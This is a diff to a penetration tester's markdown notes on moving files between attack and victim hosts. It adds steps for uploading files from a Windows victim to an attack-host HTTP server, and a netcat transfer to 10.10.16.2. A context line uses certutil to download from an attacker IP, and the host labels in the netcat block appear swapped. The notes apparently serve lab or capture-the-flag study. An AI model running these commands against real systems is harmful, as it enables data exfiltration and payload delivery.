@@ -33,13 +33,19 @@ C:\> certutil -urlcache -f http://10.10.10.2:8000/file.txt > file.txt
 ### From Victim host (Linux) to Attack host
 * python web server + wget
 ### From Victim host (Windows) to Attack host
-????
+* http file upload server on attack host
+* http post request with the file from victim host
+* detailed in "http_file_upload_server.md"
 ### Alternatives for tools
 * alternatives for python: python3, python2.7, php, perl, ruby, ...
 * alternatives for wget: curl, powershell iwr, certutil
 ## Netcat redirect file transfer
 <pre>
-dolgozzuk ki szepen
+<b># victim host</b>
+$ nc -nvlp 1234 > file.zip
+
+<b># attack host</b>
+C:\Users\Public\> nc.exe -w 3 -nv 10.10.16.2 1234 < file.zip
 </pre>
 ## SMB file transfer
 * itt jol le van irva az alja fele
